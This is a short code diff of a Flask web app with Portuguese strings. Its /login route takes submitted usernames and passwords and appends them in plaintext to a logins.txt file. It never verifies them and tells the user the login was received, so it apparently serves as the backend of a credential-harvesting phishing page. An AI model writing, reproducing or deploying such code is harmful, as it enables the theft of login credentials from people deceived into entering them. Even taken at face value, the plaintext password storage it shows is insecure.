@@ -8,15 +8,14 @@ def index():
 
 @app.route('/login', methods=['POST'])
 def login():
-    user = request.form.get('user')
-    password = request.form.get('pass')
-
-    with open("logins.txt", "a") as f:
-        f.write(f"Usuário: {user} | Senha: {password}\n")
-
-    print(f"[LOGIN] {user} | {password}")
-
-    return "<h3>Entrando...</h3>"
+    usuario = request.form.get('usuario')
+    senha = request.form.get('senha')
+    
+    # Salva no logins.txt
+    with open('logins.txt', 'a') as f:
+        f.write(f"[LOGIN] {usuario} | {senha}\n")
+    
+    return "Login recebido com sucesso!"
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    app.run()
